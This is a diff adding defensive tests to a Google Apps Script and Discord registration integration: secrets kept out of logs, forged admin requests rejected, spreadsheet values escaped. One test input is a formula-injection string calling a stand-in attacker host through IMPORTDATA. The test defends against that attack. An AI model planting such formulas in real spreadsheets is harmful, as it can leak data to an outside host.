@@ -4,7 +4,36 @@ import { gasHarness } from './gas-harness.mjs'
 import { signEnvelope } from '../worker/src/index.mjs'
 
 const post = (h, envelope) => JSON.parse(h.context.doPost({ postData: { contents: JSON.stringify(envelope) } }).text)
-const input = (h, record) => ({ action: 'approve', registrationId: record.id, revision: record.revision, messageId: record.messageId, guildId: h.properties.DISCORD_GUILD_ID, channelId: h.properties.DISCORD_CHANNEL_ID, actorId: '444444444444444444', interactionId: '555555555555555555' })
+const input = (h, record) => ({ action: 'approve', registrationId: record.id, revision: record.revision, messageId: record.messageId, guildId: h.properties.DISCORD_GUILD_ID, channelId: h.properties.DISCORD_CHANNEL_ID, actorRole: 'admin', actorId: '444444444444444444', interactionId: '555555555555555555' })
+
+test('maintenance logs Discord HTTP failure and pending counts without response content or credentials', () => {
+  const h = gasHarness(); h.context.initializeIntegration()
+  h.setResponse('response1', 'PRIVATE_BAND_NAME')
+  h.context.UrlFetchApp.fetch = () => ({ getResponseCode: () => 403, getContentText: () => 'PRIVATE_RESPONSE_BODY' })
+  h.context.runMaintenance()
+  const logs = h.state.logs.join('\n')
+  assert.match(logs, /EXTERNAL_HTTP_403/)
+  assert.match(logs, /NON_JSON_RESPONSE/)
+  assert.match(logs, /通知待ち：1、通知失敗：1/)
+  assert.equal(h.records()[0].lastError, 'DISCORD_NOTIFY_FAILED')
+  for (const value of ['PRIVATE_BAND_NAME', 'PRIVATE_RESPONSE_BODY', h.properties.DISCORD_BOT_TOKEN]) assert.equal(logs.includes(value), false)
+})
+
+test('Discord failure logs only numeric API code, never the returned message', () => {
+  const h = gasHarness(); h.context.initializeIntegration(); h.setResponse('response1')
+  h.context.UrlFetchApp.fetch = () => ({ getResponseCode: () => 403, getContentText: () => JSON.stringify({ code: 50013, message: 'PRIVATE_REMOTE_MESSAGE' }) })
+  h.context.runMaintenance()
+  assert.match(h.state.logs.join('\n'), /EXTERNAL_HTTP_403_DISCORD_CODE_50013/)
+  assert.equal(h.state.logs.join('\n').includes('PRIVATE_REMOTE_MESSAGE'), false)
+})
+
+test('Discord notification identifies the Bot using the documented User-Agent format', () => {
+  const h = gasHarness(); h.context.initializeIntegration(); h.setResponse('response1')
+  h.context.runMaintenance()
+  const request = h.state.requests.find(item => item.url.startsWith('https://discord.com/api/v10/'))
+  assert.equal(request.headers['User-Agent'], 'DiscordBot (https://github.com/LyceeSerie/SerieIndustry, 1.0.0)')
+  assert.equal(h.records()[0].noticeDirty, false)
+})
 test('read-only diagnostics isolate a bad form and still check both sheets without exposing secrets', () => {
   const h = gasHarness(); h.properties.FORM_ID = 'incorrect-form'; h.properties.ENABLED = 'false'
   const results = h.context.diagnoseIntegration()
@@ -91,4 +120,23 @@ test('sheet save locates UUID across blank rows; wrong destination and busy lock
   assert.equal(post(h, await signEnvelope(input(h, record), h.properties.GAS_HMAC_SECRET)).ok, true)
   assert.equal(sheet.data[1][0], '')
   assert.equal(h.records().length, 1); assert.equal(h.records()[0].status, 'approved')
+})
+
+
+test('forged administrative and private-sheet requests never access spreadsheets',async()=>{
+  for(const kind of ['portal_list','portal_session','portal_assign_owner','admin_info','local_claim']){
+    const h=gasHarness();let reads=0
+    h.context.SpreadsheetApp.openById=()=>{reads++;throw Error('PRIVATE_SENTINEL')}
+    const envelope=await signEnvelope({kind,portalAdmin:true,actorRole:'admin',actorId:'444444444444444444'},'wrong-secret')
+    const result=post(h,envelope)
+    assert.equal(result.ok,false);assert.equal(reads,0);assert.equal(h.state.sheetWrites,0)
+    assert.doesNotMatch(JSON.stringify(result),/PRIVATE_SENTINEL|recordJson|accessToken/)
+  }
+})
+
+test('spreadsheet formula-looking values remain literal text',()=>{
+  const h=gasHarness()
+  for(const value of ['=IMPORTDATA("https://attacker.invalid")','+1','-1','@name',"'text"]){
+    assert.equal(h.context.safeCell_(value),"'"+value)
+  }
 })
